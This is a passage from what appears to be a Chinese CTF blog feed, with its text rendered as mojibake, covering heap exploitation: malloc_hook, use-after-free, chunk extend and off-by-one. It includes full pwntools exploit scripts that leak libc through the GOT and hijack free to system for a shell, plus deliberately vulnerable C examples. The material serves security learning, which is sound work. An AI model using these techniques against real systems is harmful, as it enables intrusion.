†é¢˜é‡Œçœ‹è§å¹¶åˆ©ç”¨å®ƒ</strong>ï¼Œä¸<strong>free_hookå’Œrelloc_hook</strong>ç®€ç›´æ˜¯ä¸‰å…„å¼Ÿ</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p><strong>ä¿®æ”¹chunk-&gt;fdæŒ‡å‘malloc_hook</strong>ï¼Œç„¶åæŠŠmalloc_hookç”³è¯·å‡ºæ¥<strong>æˆä¸ºfake_chunk</strong>ï¼Œå†<strong>ä¿®æ”¹fake_chunkçš„å€¼ä¸ºone_gadget</strong>ã€‚ä¿®æ”¹å®Œæ¯•åè®°å¾—<strong>æ ¡å‡†one_gadget</strong>ï¼Œæœ‰å¯èƒ½æ— æ³•ç”Ÿæ•ˆï¼Œæ¯•ç«Ÿå¯èƒ½ä¸æ»¡è¶³one_gadgetçš„ç”Ÿæ•ˆæ¡ä»¶</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF(use_after_free)</title>
      <link href="/2025/03/10/UAF-use-after-free/"/>
      <url>/2025/03/10/UAF-use-after-free/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬å°†Use After Freeç¿»è¯‘è¿‡æ¥å°±æ˜¯é‡Šæ”¾åä½¿ç”¨ï¼šå½“ä¸€ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„æŒ‡é’ˆå—è¢«é‡Šæ”¾æ‰ä¹‹åå¯ä»¥å†æ¬¡è¢«ä½¿ç”¨ï¼Œ<br>ä½†æ˜¯è¿™æ˜¯ç”±è¦æ±‚çš„ï¼Œä¸å¦¨å°†æ‰€æœ‰çš„æƒ…å†µåˆ—ä¸¾å‡ºæ¥ï¼š</p><ul><li><strong>chunkè¢«é‡Šæ”¾ä¹‹åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸ºNULL</strong>ï¼Œå¦‚æœå†æ¬¡ä½¿ç”¨å®ƒï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚</li><li><strong>chunkè¢«é‡Šæ”¾ä¹‹åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæœªè¢«è®¾ç½®ä¸ºNULL</strong>ï¼Œå¦‚æœåœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰æ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆå†æ¬¡ä½¿ç”¨è¿™ä¸ªæŒ‡é’ˆæ—¶ç¨‹åºå¾ˆæœ‰å¯èƒ½æ­£å¸¸è¿è½¬ã€‚</li><li><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULL</strong>ï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚<br>åœ¨å †ä¸­Use After Freeä¸€èˆ¬æŒ‡çš„æ˜¯åä¸¤ç§æ¼æ´ï¼Œæˆ‘ä»¬<strong>ä¸€èˆ¬ç§°<em>è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLçš„å†…å­˜æŒ‡é’ˆ</em>ä¸ºdangling pointer(æ‚¬ç©ºæŒ‡é’ˆã€æ‚¬å‚æŒ‡é’ˆ)</strong>ã€‚<blockquote><p>æœªè¢«åˆå§‹åŒ–è¿‡çš„å†…å­˜æŒ‡é’ˆç§°ä¸ºé‡æŒ‡é’ˆ</p></blockquote></li></ul><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309202934.png" alt="Pasted image 20250309202934"><br><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309222453.png" alt="Pasted image 20250309222453"><br><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309222509.png" alt="Pasted image 20250309222509"></p><p>deleteå‡½æ•°æœªå°†æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨UAFæ¼æ´</p><p><img src="/2025/03/10/UAF-use-after-free/image-20250404130558440.png" alt="image-20250404130558440"></p><p>å› ä¸ºfree chunkä¹‹åæ²¡æœ‰å°†ptr = null</p><p><img src="/2025/03/10/UAF-use-after-free/image-20250404132313542.png" alt="image-20250404132313542"></p><p><img src="/2025/03/10/UAF-use-after-free/image-20250404132339096.png" alt="image-20250404132339096"></p><p>é‡Šæ”¾ä¸¤ä¸ªchunkå, tcacheä¸­ä¼šæœ‰ä¸¤ä¸ª0x10å¤§å°çš„chunk, å†ç”³è¯·8å­—èŠ‚çš„chunk, ä¼šè¿”å›ä¸¤ä¸ªchunk, åä¸€ä¸ªchunkå°±æ˜¯ä¹‹å‰çš„chunk0, å†™å…¥åé—¨å‡½æ•°å°±ä¼šè¦†ç›–åŸchunk0çš„å‡½æ•°åœ°å€print_note, æ–°ç”Ÿæˆçš„noteä¸æ˜¯chunk0, è€Œæ˜¯chunk3, æœ¬é¢˜çš„UAFæ˜¯æŒ‡é‡Šæ”¾chunk0å, åˆä½¿ç”¨äº†chunk0</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"> </span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note1&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note2&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"> </span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"> </span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"> </span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chunk_extend</title>
      <link href="/2025/03/10/chunk-extend/"/>
      <url>/2025/03/10/chunk-extend/</url>
      
        <content type="html"><![CDATA[<h2 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h2><p><code>chunk extend</code>æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ <code>extend</code>å¯ä»¥å®ç° <code>chunk overlapping</code>çš„æ•ˆæœã€‚è¿™ç§åˆ©ç”¨æ–¹æ³•éœ€è¦ä»¥ä¸‹çš„æ—¶æœºå’Œæ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ®ï¼Œå¦‚ä¿®æ”¹size</li></ul><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</a></p><p>æˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»º2ä¸ªå †å—çœ‹çœ‹åŠŸèƒ½</p><p>xxxxxxxxxx6 1size_t fread(void <em>ptr, size_t size, size_t nmemb, FILE </em>stream)2â€‹3ptr â€“ è¿™æ˜¯æŒ‡å‘å¸¦æœ‰æœ€å°å°ºå¯¸ size*nmemb å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆ4size â€“ è¿™æ˜¯è¦è¯»å–çš„æ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½5nmemb â€“ è¿™æ˜¯å…ƒç´ çš„ä¸ªæ•°ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º size å­—èŠ‚6stream â€“ è¿™æ˜¯æŒ‡å‘ FILE å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥ FILE å¯¹è±¡æŒ‡å®šäº†ä¸€ä¸ªè¾“å…¥æµC</p><p><img src="/2025/03/10/chunk-extend/image-20250403205513286.png" alt="image-20250403205513286"></p><p><img src="/2025/03/10/chunk-extend/image-20250403210537691.png" alt="image-20250403210537691"></p><p><code>edit</code>æœ‰<code>off-by-one</code></p><p><code>edit heap0 -&gt;content</code>å¯ä»¥ä¿®æ”¹<code>heap1</code>çš„<code>size</code></p><p><img src="/2025/03/10/chunk-extend/image-20250403210457105.png" alt="image-20250403210457105"></p><p><img src="/2025/03/10/chunk-extend/image-20250403211036200.png" alt="image-20250403211036200"></p><p>é€šè¿‡é‡Šæ”¾<code>heap_1</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/10/chunk-extend/image-20250403212553677.png" alt="image-20250403212553677"></p><p>å…ˆ<code>free heap1-&gt;content</code>ï¼Œå†<code>free heap1</code>çš„ç»“æ„å—</p><p><img src="/2025/03/10/chunk-extend/image-20250403211524923.png" alt="image-20250403211524923"></p><p>æ­¤æ—¶<code>0x40</code>çš„é“¾è¡¨ä¸Šå·²ç»æœ‰extendåçš„å—äº†</p><p><img src="/2025/03/10/chunk-extend/image-20250403211714597.png" alt="image-20250403211714597"></p><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ª<code>content_size</code>ä¸º<code>0x30</code>çš„å †å—ï¼Œå°†å¯ç”¨<code>fastbins</code>ä¸­ä¸€ä¸ª<code>0x20</code>ä½œä¸º<code>new_heap1</code>çš„ç»“æ„å—ï¼Œä»¥åŠ<code>0x40</code>çš„ä½œä¸º<code>new_heap1</code>çš„<code>content</code>å—ã€‚</p><p>æ­¤æ—¶ï¼Œå½¢æˆäº†ä¸€ä¸ªç»“æ„å—è¢«å†…å®¹å—åƒæ‰çš„å±€é¢</p><p><img src="/2025/03/10/chunk-extend/image-20250403213502584.png" alt="image-20250403213502584"></p><p>æ”¹å‰</p><p><img src="/2025/03/10/chunk-extend/image-20250403220105397.png" alt="image-20250403220105397"></p><p>ç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>edit</code>ä¿®æ”¹<code>heap</code>çš„<code>content</code>ï¼Œç›¸å½“äºæˆ‘ä»¬å¯ä»¥ä¼ªé€ <code>new_heap</code>çš„ç»“æ„å—</p><p>æ”¹åï¼Œ<code>0x602018</code>å³ä¸º<code>free_got</code></p><p><img src="/2025/03/10/chunk-extend/image-20250403215731291.png" alt="image-20250403215731291"></p><p>åœ¨showä¸­<img src="/2025/03/10/chunk-extend/image-20250403213643448.png" alt="image-20250403213643448"></p><p>ä¼šæ˜¾ç¤ºç»“æ„å—ä¸­<code>content</code>æŒ‡é’ˆå˜é‡ï¼Œå¦‚æœæŠŠè¿™ä¸ªæŒ‡é’ˆè¦†ç›–ä¸º<code>free_got</code>æŒ‡é’ˆï¼Œå†<code>show</code>ï¼Œå°±å¯ä»¥å¾—åˆ°<code>free</code>å‡½æ•°çš„çœŸå®åœ°å€ï¼Œä»è€ŒæˆåŠŸæ³„éœ²<code>libc</code></p><p>æ­¤æ—¶<code>edit new_heap1</code>çš„è¯ï¼Œç”±äº<code>content</code>çš„æŒ‡é’ˆè¢«æ”¹äº†ï¼Œ<code>edit</code>ä¼šè·Ÿç€<code>free_got</code>ä¸­çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä»–æ”¹æˆåˆ«çš„å‡½æ•°åœ°å€ï¼Œå½“æ‰§è¡Œ<code>free</code>æ—¶ï¼Œä¼šè½¬è€Œæ‰§è¡Œæˆ‘ä»¬æ‰€å¸Œæœ›çš„å‡½æ•°ï¼Œä¾‹å¦‚<code>system</code></p><p><code>heap0</code>çš„å†…å®¹å—åˆæ˜¯<code>binsh</code>ï¼Œç›´æ¥<code>getshell</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">heap = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>]))  </span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †ä¸­çš„off-by-one</title>
      <link href="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/"/>
      <url>/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>off-by-oneè¿™ç§æŠ€æœ¯ä¸ä»…ä»…é€‚ç”¨äºå †ï¼Œåœ¨æ ˆæº¢å‡ºä¸­ä¹Ÿå¯ä»¥å¾—åˆ°å¾ˆå¥½çš„åº”ç”¨ï¼Œç”±äºctfå¾ˆå–œæ¬¢åœ¨å †ä¸­å‡ºé¢˜ã€‚ä¸¥æ ¼æ¥è¯´off-by-oneæ¼æ´æ˜¯ä¸€ç§ç‰¹æ®Šçš„æº¢å‡ºæ¼æ´ï¼Œoff-by-oneæŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>off-by-oneè¿™ç§æ¼æ´çš„å½¢æˆå’Œæ•´å½¢æº¢å‡ºå¾ˆç›¸ä¼¼ï¼Œå¾€å¾€éƒ½æ˜¯ç”±äºå¯¹è¾¹ç•Œçš„æ£€æŸ¥ä¸å¤Ÿä¸¥è°¨ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å’Œå†™å…¥çš„sizeæ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µï¼Œè¾¹ç•ŒéªŒè¯ä¸ä¸¥è°¨é€šå¸¸æœ‰ä¸¤ç§æƒ…å†µï¼š</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †å—ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯çš„æ¬¡æ•°è®¾ç½®é”™è¯¯ï¼Œå¯¼è‡´å¤šå†™äº†ä¸€ä¸ªå­—èŠ‚ï¼Œåé¢ä¼šä¸¾ä¾‹è®²è§£</li><li>å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯<h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><h4 id="1-å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨"><a href="#1-å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨" class="headerlink" title="1.å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨"></a>1.å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> my_gets(char *ptr,<span class="built_in">int</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    char *chunk1,*chunk2;</span><br><span class="line">    chunk1 = (char *)malloc(<span class="number">16</span>);</span><br><span class="line">    chunk2 = (char *)malloc(<span class="number">16</span>);</span><br><span class="line">    puts(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯"><a href="#2-å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯" class="headerlink" title="2.å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯"></a>2.å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    chunk1=malloc(<span class="number">24</span>);</span><br><span class="line">    puts(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(strlen(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        strcpy(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>è¿˜æ˜¯è®²ä¸€ä¸‹è¿™ä¸ª ä¾‹å­çš„æµç¨‹ï¼Œé¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ª40å­—èŠ‚çš„å­—ç¬¦ä¸²bufferï¼Œç„¶ååˆåˆ›å»ºäº†ä¸€ä¸ª24å­—èŠ‚çš„å †chunk1ã€‚æ¥ç€ä»å¤–éƒ¨æ¥æ”¶å­—ç¬¦ä¸²å¹¶å­˜æ”¾åœ¨å­—ç¬¦ä¸²bufferä¸­ï¼Œç„¶ååˆ¤æ–­bufferä¸­çš„å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯å¦ä¸º24ä¸ªå­—èŠ‚ï¼Œå¦‚æœæ˜¯å°†è¿™æ®µå­—ç¬¦ä¸²æ”¾åœ¨å †ä¸­ã€‚å…¶å®ä¹ä¸€çœ‹æ¥å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªéšå½¢çš„ä¸œè¥¿ï¼Œå°±æ˜¯ç»“æŸç¬¦\x00ã€‚<code>strcpyå‡½æ•°åœ¨æ‹·è´çš„æ—¶å€™ä¹Ÿä¼šå°†ç»“æŸç¬¦\x00å­˜å…¥å †å—ä¸­</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³chunk1ä¸­ä¸€å…±å†™äº†25ä¸ªå­—èŠ‚ï¼Œè¿™å°±å¯¼è‡´äº†chunk1æº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306141645.png" alt="Pasted image 20250306141645"></li></ul><p>sub_9F5<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150505.png" alt="Pasted image 20250306150505"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150525.png" alt="Pasted image 20250306150525"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150445.png" alt="Pasted image 20250306150445"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306144232.png" alt="Pasted image 20250306144232"><br>å…³é”®ç‚¹</p><ul><li>ä½œè€…åå­˜æ”¾åœ¨off_202018æŒ‡é’ˆä¸­ï¼Œè¿™ä¸ªæŒ‡é’ˆä¸€å…±32ä¸ªå­—èŠ‚</li><li>å›¾ä¹¦ç»“æ„ä½“æŒ‡é’ˆå­˜æ”¾åœ¨off_202010æŒ‡é’ˆä¸­</li><li>sub_9F5()å‡½æ•°å­˜åœ¨off-by-oneæ¼æ´ï¼Œåœ¨é¦–æ¬¡åˆ›å»ºä½œè€…åæˆ–ä¿®æ”¹ä½œè€…åçš„æ—¶å€™ï¼Œå¦‚æœå¡«å†™32ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´\x00æº¢å‡ºåˆ°off_202018çš„ä½ä½</li></ul><p>è¾“å…¥ä»»æ„32ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²å°†å­˜æ”¾ä½œè€…åçš„off_202018ç©ºé—´å¡«æ»¡<br>å°†ä»£ç æ®µèµ·å§‹åœ°å€åŠ ä¸Šoff_202018çš„åç§»å°±å¯ä»¥å¾—åˆ°å­˜æ”¾ä½œè€…ååœ°å€çš„æŒ‡é’ˆäº†ï¼š<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306191120.png" alt="Pasted image 20250306191120"></p><p>å¯ä»¥çœ‹åˆ°0x55555575602010ä¸­å­˜æ”¾çš„å°±æ˜¯å›¾ä¹¦1çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç´§è·Ÿç€çš„å°±æ˜¯å›¾ä¹¦2çš„ç»“æ„ä½“æŒ‡é’ˆã€‚è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä½œè€…åä¹Ÿç´§ç´§åœ°è´´åœ¨ä¸¤ä¸ªç»“æ„ä½“æŒ‡é’ˆå‰é¢ï¼Œè¿™æ˜¯å› ä¸ºå­˜æ”¾è¿™ä¸¤ä¸ªä¸œè¥¿çš„off_202010å’Œoff_202018æ˜¯æŒ¨ç€çš„<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306202108.png" alt="Pasted image 